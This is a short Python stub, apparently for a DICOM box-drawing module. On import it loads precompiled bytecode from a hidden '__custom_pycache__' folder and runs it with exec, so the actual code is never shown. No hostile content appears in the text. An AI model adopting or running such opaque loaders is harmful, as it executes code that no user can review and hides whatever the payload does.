
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DicomDrawBoxes_a20cd20255df41dbbef9e5bafd0128d6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
